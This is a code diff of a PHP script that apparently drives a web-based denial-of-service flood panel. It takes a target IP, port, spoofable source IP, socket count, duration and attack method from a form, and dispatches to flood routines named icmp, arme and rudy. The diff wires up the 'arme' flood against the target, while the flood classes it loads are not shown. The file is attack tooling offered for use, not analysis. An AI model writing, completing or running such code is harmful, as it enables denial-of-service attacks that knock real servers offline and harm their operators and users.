@@ -1,22 +1,67 @@
 <?php
-if(isset($_POST['attack'])){
-	$socketn = $_POST['builds'];
-	$lenght = $_POST['lenght'];
-	$timedout = $_POST['timedout'];
-	$ip = $_POST['ip'];
-	$srcip = $_POST['srcip'];
-	$method = $_POST['method'];  
-	$port = $_POST['port']; 
-	$exec_time = $_POST['time']; 
-	$thread = $_POST['thread']; 
+include_once "header.php";
 
-	$packets = 0; 
+	//Number of socket
+	if(!empty($_POST['builds'])){
+		$socketn = $_POST['builds'];
+	}else{$socketn = 100;}
+	//Message length
+	if(!empty($_POST['lenght'])){
+		$lenght = $_POST['lenght'];
+	}else{$lenght = 1024;}
+	//timeout
+	if(!empty($_POST['timedout'])){
+		$timedout = $_POST['timedout'];
+	}else{$timedout = 30;}
+	//Host
+	if(!empty($_POST['ip'])){
+		$ip = $_POST['ip'];
+	}else{
+		echo "host is empty!";
+		//break;
+	}
+	//Source IP
+	if(!empty($_POST['srcip'])){
+		$srcip = $_POST['srcip'];
+	}else{$srcip = "";}
+	//Method
+	if(!empty($_POST['method'])){
+		$method = $_POST['method'];  
+	}else{
+		echo "method is empty!";
+		//break;
+	}
+	//Port
+	if(!empty($_POST['port'])){
+		$port = $_POST['port']; 
+	}else{$port = 80;}
+	//Exec Time
+	if(!empty($_POST['time'])){
+		$exec_time = $_POST['time'];  
+	}else{
+		echo "exec_time is empty!";
+		//break;
+	}
+	//Thread
+	/*if(!empty($_POST['thread'])){
+		$thread = $_POST['thread'];   
+	}else{$thread = 60;}*/
+
+	
+
+
+	$packets = 0;
 	$starttime = date("Y-m-d H:i:s");
+	$max_time = time()+$exec_time;
+
+	
+
 	ignore_user_abort(FALSE); 
-	$time = time(); 
-	$max_time = $time+$exec_time; 
 	ini_set('max_execution_time', $max_time);
 
+	include_once "../class/attack.php";
+	$attack = new attack($socketn, $lenght, $timedout, $ip, $srcip, $port, $max_time);
+	
 	switch ($method) {
     case "icmp":
         
@@ -43,7 +88,10 @@ if(isset($_POST['attack'])){
 		
 		break;
 	case "arme":
-		
+		include_once "../class/flood/arme.php";
+    	$worker = new arme($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
+    	$packets +=$worker->start();
+		echo $packets;
 		break;
 	case "rudy":
 		
@@ -68,7 +116,7 @@ if(isset($_POST['attack'])){
 		break;
 	}
 
-	
-}
+
+
 
 ?>
